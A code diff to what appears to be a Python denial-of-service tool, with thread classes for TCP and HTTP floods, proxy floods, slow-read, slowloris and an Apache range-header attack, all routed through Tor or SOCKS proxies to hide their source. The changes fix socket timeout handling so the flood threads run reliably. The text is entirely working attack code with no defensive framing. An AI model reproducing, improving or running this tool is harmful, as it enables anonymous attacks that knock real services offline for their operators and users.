@@ -105,10 +105,10 @@ class tcflood(threading.Thread):
   while (stop!=True):
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout=(timeout)
+    if tor==False:
+     s.settimeout=(timeout)
     if tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
-    s.settimeout(timeout)
     s.connect((target,port))
     if (port==443) or (port==8443):
       s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
@@ -197,10 +197,10 @@ class htflood(threading.Thread):
   while (stop!=True):
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout=(timeout)
+    if tor==False:
+     s.settimeout=(timeout)
     if tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
-    s.settimeout(timeout)
     s.connect((target,port))
     if ((port==443) or (port==8443)):
       s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
@@ -352,7 +352,8 @@ class prflood(threading.Thread):
      s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
     elif (z in [17,18,19,20]):
      s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
-    s.settimeout(timeout)
+    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
+     s.settimeout(timeout)
     s.connect((target,port))
     if ((port==443) or (port==8443)):
       s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
@@ -485,7 +486,8 @@ class reqpost(threading.Thread):
   while (stop!=True):
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout=(timeout)
+    if tor==False:
+     s.settimeout(timeout)
     if tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.connect((target,port))
@@ -580,7 +582,7 @@ class pham(threading.Thread):
      s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     if z<13:
-     s.settimeout=(timeout)
+     s.settimeout(timeout)
     s.connect((target,port))
     if ((port==443)or(port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
@@ -712,7 +714,8 @@ class xer(threading.Thread):
   while (stop!=True):
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout=(timeout)
+    if tor==False:
+     s.settimeout(timeout)
     if tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.settimeout(timeout)
@@ -801,7 +804,7 @@ class pxer(threading.Thread):
      s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     if z<13:
-     s.settimeout=(timeout)
+     s.settimeout(timeout)
     s.connect((target,port))
     while (stop!=True):
      s.send("\x00")
@@ -869,10 +872,10 @@ class slrd(threading.Thread):
   while (stop!=True):
    try: 
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout=(timeout)
+    if tor==False:
+     s.settimeout(timeout)
     if tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
-    s.settimeout(timeout)
     s.connect((target,port))
     if ((port==443)or(port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
@@ -955,7 +958,8 @@ class apa(threading.Thread):
     for x in range(1,random.randint(1200,1300)):
      apache+=',5-'+str(x)
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout=(timeout)
+    if tor==False:
+     s.settimeout(timeout)
     if tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.connect((target, port))
@@ -994,6 +998,8 @@ class ptc(threading.Thread):
     elif (z in [17,18,19,20]):
      s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+    if z<13:
+     s.settimeout(timeout)
     s.connect((target,port))
     while (stop!=True):
      pa=random.choice(paths)
@@ -1143,10 +1149,9 @@ class loris(threading.Thread):
   time.sleep(1)
   while (stop!=True):
    try:
-    s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(timeout)
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout=(timeout)
+    if tor==False:
+     s.settimeout(timeout)
     if tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.connect((target, port))
